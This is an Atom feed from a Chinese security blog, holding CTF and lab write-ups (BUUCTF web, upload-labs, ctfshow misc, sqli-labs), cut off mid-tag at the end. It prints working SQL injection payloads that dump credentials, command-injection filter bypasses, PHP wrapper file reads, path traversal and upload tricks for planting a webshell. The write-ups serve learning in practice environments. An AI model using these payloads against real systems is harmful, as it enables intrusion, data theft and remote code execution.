<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>大白</title>
  
  
  <link href="https://dabai5269.top/atom.xml" rel="self"/>
  
  <link href="https://dabai5269.top/"/>
  <updated>2023-04-12T12:07:15.222Z</updated>
  <id>https://dabai5269.top/</id>
  
  <author>
    <name>大白</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>BUUCTF-web(1)</title>
    <link href="https://dabai5269.top/post/5473bd.html"/>
    <id>https://dabai5269.top/post/5473bd.html</id>
    <published>2023-04-12T10:53:31.000Z</published>
    <updated>2023-04-12T12:07:15.222Z</updated>
    
    <content type="html"><![CDATA[<h2 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 万能公式</span><br><span class="line">1 and 1=1</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">1 or 1=1 </span><br><span class="line">1&#x27; or &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用万能密码登录<strong>1’ or  ‘1’&#x3D;’1</strong></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412190347772.png" alt="image-20230412190347772"></p><h2 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h2><p>查看网页源代码，get方式传入cat&#x3D;dog即可</p><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412190710177.png" alt="image-20230412190710177"></h2><h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><p>查看源代码，得到提示</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412191003372.png" alt="image-20230412191003372"></p><p>对源码进行解析</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    class emmm</span><br><span class="line">    &#123;</span><br><span class="line">        public static function checkFile(&amp;$page)</span><br><span class="line">        &#123;</span><br><span class="line">            $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</span><br><span class="line">            //条件一：page的值为空或者不是字符串，那么不通过</span><br><span class="line">            if (! isset($page) || !is_string($page)) &#123;</span><br><span class="line">                echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">//条件二：page的值在白名单中，则通过</span><br><span class="line">            if (in_array($page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">//返回page中从第0位开始到第一个？出现的位置，之间的值赋给page</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;)//查找字符串在另一个字符串中首次出现的位置</span><br><span class="line">            );</span><br><span class="line">            //条件三：page中?之前的值在白名单中，则通过</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">//将url编码后的字符串还原成未编码的样子，然后赋值给page</span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            //返回page中从第0位开始到第一个？出现的位置，之间的值赋给page</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                0,</span><br><span class="line">                mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;)//查找字符串在另一个字符串中首次出现的位置</span><br><span class="line">            );</span><br><span class="line">            //条件四：page还原成未编码之后，?前面的值是否在白名单内，是则通过</span><br><span class="line">            if (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                return true;</span><br><span class="line">            &#125;</span><br><span class="line">            echo &quot;you can&#x27;t see it&quot;;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">//以上条件满足一个则结果包含file</span><br><span class="line">    if (! empty($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;])</span><br><span class="line">    ) &#123;</span><br><span class="line">        include $_REQUEST[&#x27;file&#x27;];</span><br><span class="line">        exit;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;;</span><br><span class="line">    &#125;  </span><br><span class="line">//这一坨代码，告诉我们，你输入的payload不为空，是字符串，且前面那个函数返回是ture，</span><br><span class="line">//才能给你include包含文件。这也是为什么我们file=后面要先接一个hint.php或者resource.php</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure><p>从hint.php开始，..&#x2F;五个，读取文件</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412191836788.png" alt="image-20230412191836788"></p><p>题外话</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这和linux系统是一样的， </span><br><span class="line"></span><br><span class="line">. 表示当前目录</span><br><span class="line">.. 表示当前目录的上一级目录。</span><br><span class="line">./表示当前目录下的某个文件或文件夹，视后面跟着的名字而定</span><br><span class="line">../表示当前目录上一级目录的文件或文件夹，视后面跟着的名字而定。</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">文件夹 a</span><br><span class="line">下面有  文件夹b c 和文件 d。</span><br><span class="line">文件夹b下面有e.php 和文件f。</span><br><span class="line"></span><br><span class="line">则e中的 . 表示 文件夹b</span><br><span class="line">./f 表示b下面的文件f。</span><br><span class="line">..  表示a文件夹。</span><br><span class="line">../d 表示a文件夹下的d文件。</span><br></pre></td></tr></table></figure><h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><p>题目提示包含漏洞</p><p>利用PHP封装协议：<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412192213420.png" alt="image-20230412192213420"></p><p>得到base64解码得到flag</p><h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>常见管道符直接执行命令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. | （按位或），直接执行|后面的语句</span><br><span class="line">2. || （逻辑或），如果||前面的语句是错误的，则执行后面的语句，否则的话只执行前面的语句</span><br><span class="line">3. &amp; （按位与），无论&amp;前后的语句真假，都要执行</span><br><span class="line">4. &amp;&amp; （逻辑与），若前面的语句为假，则后面的语句也不执行；若前面的语句为真则执行前后两条语句</span><br><span class="line">5. ; (作用和&amp;一样)</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412193305228.png" alt="image-20230412193305228"></p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>输入1和2都回显正常</p><p>输入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 3 #</span><br></pre></td></tr></table></figure><p>出现报错</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412193723936.png" alt="image-20230412193723936"></p><p>说明字段有两位，尝试联合注入查询</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union seclet 1,2#</span><br></pre></td></tr></table></figure><p>不行，过滤了<strong>select|update|delete|drop|insert|where|.&#x2F;i</strong></p><p>我们尝试堆叠注入，原理很简单，就是通过 ; 号注入多条SQL语句。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;show databases; #</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412194247241.png" alt="image-20230412194247241"></p><p>爆表名<strong>1’; show tables;#</strong></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412194440570.png" alt="image-20230412194440570"></p><p>查表的字段<strong>1’;show columns from words;#</strong></p><p><strong>1’; show columns from <code>1919810931114514</code>;#</strong><br><strong>注意：表名为数字时，要用&#96;包起来查询。</strong></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412194738125.png" alt="image-20230412194738125"></p><p>flag 找到了，该怎么查看数据呢</p><p>方法一：改名换姓</p><p>我们可以“改名换姓”把1919810931114514表名改成words表，仅如此还不够，由于words表有两个字段，我们需要把新的words表也变成两个字段</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; rename table words to word1; rename table &#x27;1919810931114514&#x27; to words;alter table words add id int unsigned not Null auto_increment primary key; alert table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure><p>方法二：关键字编码绕过</p><p>select被过滤了，那么我们可以绕过这个过滤（16进制编码）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;SeT@a=0x&lt;这里填查询语句的十六进制代码&gt;;prepare execsql from @a;execute execsql;#</span><br><span class="line">也就是：</span><br><span class="line">1&#x27;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span><br></pre></td></tr></table></figure><p>方法三：关键字过滤之等价函数替换</p><p>查询语句除了我们常用的“SELECT”语句以外还有HANDLER。并且在官方的说明中“HANDLER查询性能比SELECT更好”所以我们可以直接换个查询函数赛。（我不李姐）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; handler `1919810931114514` open as flag; handler flag read next;#</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412195335176.png" alt="image-20230412195335176"></p><h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>题目提示ping</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;ls</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412195655093.png" alt="image-20230412195655093"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1;cat flag.php</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412195808644.png" alt="image-20230412195808644"></p><p>提示过滤了空格（f*uk）</p><p>空格绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;IFS&#125;替换</span><br><span class="line">$IFS$1替换</span><br><span class="line">$&#123;IFS替换</span><br><span class="line">%20替换</span><br><span class="line">&lt;和&lt;&gt;重定向符替换</span><br><span class="line">%09替换</span><br></pre></td></tr></table></figure><p>查看一下源代码</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412200159641.png" alt="image-20230412200159641"></p><p>这里 匹配一个字符串中，是否按顺序出现过flag四个字母。所以不能有flag。那我们进行绕过</p><p>变量绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><p>然后查看网页源代码得到flag</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230412200708343.png" alt="image-20230412200708343"></p>]]></content>
    
    
    <summary type="html">web</summary>
    
    
    
    
    <category term="BUUCTF" scheme="https://dabai5269.top/tags/BUUCTF/"/>
    
  </entry>
  
  <entry>
    <title>upload-labs</title>
    <link href="https://dabai5269.top/post/80f02bc5.html"/>
    <id>https://dabai5269.top/post/80f02bc5.html</id>
    <published>2023-04-07T05:32:14.000Z</published>
    <updated>2023-04-07T07:17:27.113Z</updated>
    
    <content type="html"><![CDATA[<p>文件上传漏洞被利用需要<strong>两个前提条件</strong>：</p><p>1、文件能上传成功</p><p>2、攻击者能知道文件路径</p><p>凡是上传图片并显示的关卡，都有<strong>三种方式可以知道文件路径</strong></p><p>1、最简单直接的，在没显示出来的图片上右键选择“复制图像链接”，可以得到文件的绝对路径</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/123c53e523fa4a86aa967a84de16ba67.png" alt="123c53e523fa4a86aa967a84de16ba67"></p><p>2、网页上右键选择“查看页面源代码”，源代码中显示文件的相对路径</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407135835211.png" alt="image-20230407135835211"></p><p>3、如果是用burpsuite上传的文件，response报文中也会显示文件的相对路径。</p><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><h3 id="方法1：浏览器disable-JS"><a href="#方法1：浏览器disable-JS" class="headerlink" title="方法1：浏览器disable JS"></a>方法1：浏览器disable JS</h3><p>firefox可以安装一个叫Script Switch的插件，安装成功之后，就是下图右上角小红框里那个图标，使其处在JS disabled状态，上传x.php。出现下图这样没加载成功的图片表示webshell已经上传成功。</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/92b2e5477ba24b1eabbe94cf11f0b4a0.png" alt="92b2e5477ba24b1eabbe94cf11f0b4a0"></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/123c53e523fa4a86aa967a84de16ba67.png" alt="123c53e523fa4a86aa967a84de16ba67"></p><p>到服务器上看看，上传成功的webshell在 <strong>upload-labs目录\upload</strong> 文件夹下</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/1efdc543145546be85193f2cb585990b.png" alt="1efdc543145546be85193f2cb585990b"></p><p>蚁剑连接也可以看到已经上传</p><h3 id="方法2：-bp抓包修改后缀"><a href="#方法2：-bp抓包修改后缀" class="headerlink" title="方法2： bp抓包修改后缀"></a>方法2： bp抓包修改后缀</h3><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/b6b05f1cc2d749eea3164807c384fe7f.png" alt="b6b05f1cc2d749eea3164807c384fe7f"></p><p>蚁剑连接即可看到文件已经上传</p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><h3 id="方法1：上传2-png-再修改后缀即可"><a href="#方法1：上传2-png-再修改后缀即可" class="headerlink" title="方法1：上传2.png,再修改后缀即可"></a>方法1：上传<strong>2.png</strong>,再修改后缀即可</h3><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/b6b05f1cc2d749eea3164807c384fe7f.png" alt="b6b05f1cc2d749eea3164807c384fe7f"></p><p>复制图片连接，去蚁剑连接</p><h3 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h3><p>上传·2.php,将抓到的包发送到<strong>repeater</strong>，然后把<strong>Content-Type</strong>的值改为<strong>image&#x2F;png</strong></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/f1090bf94447411ba28ea3631b9e7e69.png" alt="f1090bf94447411ba28ea3631b9e7e69"></p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>首先上传个1.php，发现页面提示是”不允许上传……后缀文件“，并且burpsuite有抓到包，初步判断，这关可能是后端文件后缀黑名单过滤。</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407140010914.png" alt="image-20230407140010914"></p><p>payload写一些有可能被解析为php的文件后缀的字符，大小写绕过，双写绕过，一些利用操作系统特性（比如服务器是windows系统的话，结尾加点，加空格，加::$DATA，后缀某几个字母大写），web容器解析漏洞绕过黑名单的后缀……</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407141147135.png" alt="image-20230407141147135"></p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407141107881.png" alt="image-20230407141107881"></p><p>上图的文件后缀是正常的，是有用的，用webshell管理工具连接的时候，文件名写202304071406293829.php就行</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407141251693.png" alt="image-20230407141251693"></p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>这关上传了1.php之后，只是提示这个文件不能上传。</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407145416298.png" alt="image-20230407145416298"></p><p>把后缀改成png之后，可以上传成功。可以初步判断，本关不检查文件内容，检查点应该在<strong>Content-Type</strong>或者<strong>文件后缀</strong>，或者两者都有。</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407145704699.png" alt="image-20230407145704699"></p><p>先看看Content-Type有无影响。把Content-Type从image&#x2F;png改成application&#x2F;octet-stream，发送之后，发现文件依然能上传成功，说明本关Content-Type无影响。</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407145850092.png" alt="image-20230407145850092"></p><p>接下来判断一下文件后缀是黑名单过滤还是白名单过滤：</p><p>文件后缀改成.xxx，发送后发现文件上传成功，说明本关还是文件后缀黑名单过滤</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407145939292.png" alt="image-20230407145939292"></p><p>HTTP EXP：将文件后缀名改为“<strong>点+空格+点</strong>”的格式，这样<strong>file_ext会变为空</strong>，成功绕过黑名单上传。<strong>Windows会自动删除文件名最后的点</strong>，最后变为2.php。</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230407151322154.png" alt="image-20230407151322154"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;2.php. .&quot;</span><br></pre></td></tr></table></figure><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>和Pass-04一样，代码中只过滤了一次点，删除了空格和::$DATA，将文件后缀改为小写，黑名单等，使用Pass-04的方法绕过即可。但黑名单中屏蔽了.htaccess文件。</p><p>HTTP EXP：文件名改为“2.php. . ”。</p>]]></content>
    
    
    <summary type="html">upload-labs前五关</summary>
    
    
    
    
    <category term="靶场" scheme="https://dabai5269.top/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>misc50</title>
    <link href="https://dabai5269.top/post/2679200a.html"/>
    <id>https://dabai5269.top/post/2679200a.html</id>
    <published>2023-04-03T13:18:13.000Z</published>
    <updated>2023-04-03T13:48:38.737Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230403212338535.png" alt="image-20230403212338535"></p><p>丢进010在文件中部找到密文</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sk5DVlM2Mk1NRjVIU1gyTk1GWEgyQ1E9Cg==</span><br></pre></td></tr></table></figure><p>base64解码，在base32解码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">KEY&#123;Lazy_Man&#125;</span><br></pre></td></tr></table></figure><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230403212707857.png" alt="image-20230403212707857"></p><p>图片大小过大，用binwalk查看</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230403212904989.png" alt="image-20230403212904989"></p><p>binwalk -e分离文件得到flag.zip</p><p>我的解压软件看不到提示，直接跑出zip密码：<strong>123456</strong></p><p>thienc.txt里的<strong>3078</strong>就是十六进制中的<strong>0x</strong></p><p>python脚本将thienc.txt转为十六进制文本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">filepath</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filepath) <span class="keyword">as</span> fp:</span><br><span class="line">        content=fp.read();</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line">number = read_file(<span class="string">&#x27;thienc.txt&#x27;</span>)</span><br><span class="line">result = []</span><br><span class="line">result.append(re.findall(<span class="string">r&#x27;.&#123;2&#125;&#x27;</span>, number))</span><br><span class="line">result = result[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">strings =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">    y = <span class="built_in">bytearray</span>.fromhex(i)</span><br><span class="line">    z = <span class="built_in">str</span>(y)</span><br><span class="line">    z= re.findall(<span class="string">&quot;b&#x27;(.*?)&#x27;&quot;</span>,z)[<span class="number">0</span>]</span><br><span class="line">    strings += z</span><br><span class="line"></span><br><span class="line">b= strings.split(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line"></span><br><span class="line">strings=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> b:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(i) ==<span class="number">1</span>:</span><br><span class="line">        i= <span class="string">&#x27;0&#x27;</span> + i</span><br><span class="line">    strings +=i</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(strings)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;complete！&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到文本</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230403213659443.png" alt="image-20230403213659443"></p><p>注意到37 7A BC AF是<strong>7z</strong>格式压缩文件的文件头</p><p>复制文本粘贴进010<strong>（ctrl+shift+v）</strong>，将文件后缀保存为7z</p><p>得到一个加密的文档， 结合之前得到的key  解压得到secenc.txt</p><p>很明显为base64编码，但解码不对</p><p>发现这段字符串经过了多重的base64和base32混合编码。循环用正则表达式匹配判断编码类型然后解码： 脚本为</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;secenc.txt&#x27;</span>).read().encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">&#x27;^[2-7A-Z=]+$&#x27;</span>, f.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        f = base64.b32decode(f)</span><br><span class="line">    <span class="keyword">elif</span> re.<span class="keyword">match</span>(<span class="string">&#x27;^[0-9a-zA-Z+/=]+$&#x27;</span>, f.decode(<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        f = base64.b64decode(f)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(f.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;result1.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(<span class="built_in">str</span>(f,encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Decryption complete!&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出结果：</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230403214329615.png" alt="image-20230403214329615"></p><p>ook编码，解码得到</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230403214640117.png" alt="image-20230403214640117"></p><p>brainfuck –&gt;text运行得到：</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20230403214737633.png" alt="image-20230403214737633"></p>]]></content>
    
    
    <summary type="html">ctfshow misc50</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>CTFSHOW-WEB入门-信息搜集</title>
    <link href="https://dabai5269.top/post/50f2f890.html"/>
    <id>https://dabai5269.top/post/50f2f890.html</id>
    <published>2023-03-23T12:09:21.000Z</published>
    <updated>2023-04-03T13:48:38.734Z</updated>
    
    
    <summary type="html">CTFSHOW-WEB入门-信息搜集</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>sqli-labs</title>
    <link href="https://dabai5269.top/post/b3432909.html"/>
    <id>https://dabai5269.top/post/b3432909.html</id>
    <published>2023-03-22T12:16:16.000Z</published>
    <updated>2023-03-23T11:58:52.857Z</updated>
    
    <content type="html"><![CDATA[<h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><h3 id="数字型"><a href="#数字型" class="headerlink" title="数字型"></a>数字型</h3><ol><li><strong>Url 地址中输入 <a href="http://xxx/xx.php?id=">http://xxx/xx.php?id=</a> x and 1&#x3D;1 页面依旧运行正常，继续进行下一步。</strong></li><li><strong>Url 地址中继续输入 <a href="http://xxx/xx.php?id=">http://xxx/xx.php?id=</a> x and 1&#x3D;2 页面运行错误，则说明此 Sql 注入为数字型注入。</strong></li></ol><h3 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h3><ol><li><p><strong>Url 地址中输入 <a href="http://xxx/xx.php?id=">http://xxx/xx.php?id=</a> x’ and ‘1’&#x3D;’1 页面运行正常，继续进行下一步。</strong></p><p>2.<strong>Url 地址中继续输入 <a href="http://xxx/xx.php?id=">http://xxx/xx.php?id=</a> x’ and ‘1’&#x3D;’2 页面运行错误，则说明此 Sql 注入为字符型注入。</strong></p></li></ol><h2 id="猜解数据库中字段数"><a href="#猜解数据库中字段数" class="headerlink" title="猜解数据库中字段数"></a>猜解数据库中字段数</h2><p>​    <strong>使用 order by x 进行猜解的时候可以使用二分法进行猜解，先使用大一点的数字数字进行测试，如果报错就换数字的一半进行测试，当范围缩小时在依次测试。</strong><br> <strong>注意：</strong> <em>(–+为注释，将–+之后的语句都注释)</em></p><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 这是字符型注入</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1</span><br><span class="line"># 使用order by进行联合注入，显示字段</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=1&#x27; order by 3 --+</span><br><span class="line"># 在我们回显字段，将id改成错误的值（-1，0，-2等）</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,2,3 --+</span><br><span class="line"># 通过回显数值我们将该数值显示成数据库的名称 利用database()函数</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),3 --+</span><br><span class="line"># 获得数据库名称后，再获取数据库中的表，获取全部的表需要一个group_concat()函数</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br><span class="line"># 在获得数据表以后,我们来获取users表中的列名</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; --+</span><br><span class="line"># 获取到列名以后，我们再获取该列数据</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),group_concat(username ,&#x27;:&#x27;, password) from users --+</span><br></pre></td></tr></table></figure><p>sql注入完成，下图<img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/7caf5a7f70244185b669b92d2026b58f.png" alt="7caf5a7f70244185b669b92d2026b58f"></p><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>第二关为数字型注入和第一个一样，删除 id&#x3D;1后面的引号即可</p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>第三关的注入类型是基于 ‘) 的注入，只需要把注入点改为 ‘) 就可以了。</p><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p> 输入单引号进行测试：</p><p><img src="https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/74e406b234e645c29efa332800e9da0e.png" alt="74e406b234e645c29efa332800e9da0e"></p><p>我们发现并没有报错，那么就有可能是数据库后台把单引号过滤了，既然单引号类型被过滤了，那么我们就去测试双引号，我们输入注入语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&quot;</span><br></pre></td></tr></table></figure><p><img 